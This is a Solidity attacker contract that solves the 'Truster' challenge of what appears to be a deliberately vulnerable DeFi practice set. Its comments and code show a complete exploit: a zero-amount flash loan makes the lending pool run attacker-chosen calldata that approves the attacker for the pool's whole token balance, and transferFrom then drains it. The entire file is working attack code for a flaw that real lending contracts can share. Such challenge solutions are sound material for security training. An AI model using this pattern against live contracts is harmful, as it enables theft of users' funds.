// SPDX-License-Identifier: MIT
// TRUSTER DRAIN (arbitrary external call class).
// Technique: a zero-amount flash loan executes attacker-chosen calldata from
// the pool's context — we make the pool approve us for its entire balance,
// then sweep everything with transferFrom. No callback contract needed.
pragma solidity ^0.8.0;

import {ERC20Mintable} from "../tokens/ERC20Mintable.sol";
import {TrusterLenderPool} from "../challenges/TrusterLenderPool.sol";

contract TrusterAttacker {
    TrusterLenderPool public immutable pool;
    ERC20Mintable public immutable token;
    address public immutable owner;

    constructor(address _pool) {
        pool = TrusterLenderPool(_pool);
        token = ERC20Mintable(pool.damnValuableToken());
        owner = msg.sender;
    }

    function attack() external {
        // 1. Flash loan of zero executes token.approve(this, ALL) as the pool.
        pool.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSelector(ERC20Mintable.approve.selector, address(this), type(uint256).max)
        );

        // 2. Sweep the pool's entire balance.
        token.transferFrom(address(pool), owner, token.balanceOf(address(pool)));
    }

    receive() external payable {}
}
